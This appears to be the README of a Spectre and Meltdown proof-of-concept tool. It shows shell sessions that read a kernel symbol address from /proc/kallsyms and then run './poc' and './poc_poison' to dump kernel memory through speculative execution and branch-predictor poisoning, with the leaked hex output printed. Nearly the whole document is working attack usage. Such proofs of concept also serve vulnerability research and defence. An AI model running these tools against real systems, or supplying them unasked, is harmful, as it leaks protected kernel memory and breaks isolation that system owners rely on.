Spectre and Meltdown Proof-of-Concept
=====================================

Read kernel addresses by stalling the pipeline and speculatively hitting a cacheline:

```
$ make
...
$ grep ' sys_call_table' /proc/kallsyms
ffffffff8f800180 R sys_call_table
$ ./poc ffffffff8f800180
0xffffffff8f800180 | 10 40 23 8f ff ff ff ff d0 40 23 8f ff ff ff ff
0xffffffff8f800190 | c0 14 23 8f ff ff ff ff 60 f6 22 8f ff ff ff ff
0xffffffff8f8001a0 | 40 91 23 8f ff ff ff ff 70 91 23 8f ff ff ff ff
0xffffffff8f8001b0 | 50 91 23 8f ff ff ff ff 10 af 24 8f ff ff ff ff
...
```

Read kernel addresses by poisoning the branch predictor and speculatively hitting a cacheline:
```
$ ./poc_poison ffffffff8f800180
cutoff: 192
0xffffffff8f800180 | 10 40 23 8f ff ff ff ff d0 40 23 8f ff ff ff ff
...
```

Visualize memory read timings:
```
$ ./poc_vis ffffffff8f800180
```
